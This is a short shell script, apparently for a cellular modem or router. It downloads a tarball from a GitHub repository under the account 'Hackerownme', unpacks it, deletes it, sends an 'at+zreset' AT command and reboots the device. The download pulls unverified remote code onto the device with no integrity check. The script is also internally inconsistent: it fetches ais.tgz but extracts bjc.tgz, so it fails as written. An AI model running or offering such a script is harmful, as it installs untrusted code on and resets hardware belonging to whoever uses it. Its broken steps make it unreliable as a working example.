#!/bin/sh
wget https://github.com/Hackerownme/bjc/raw/main/ais.tgz
tar -zxvf bjc.tgz
rm ais.tgz
at_cmd at+zreset
reboot
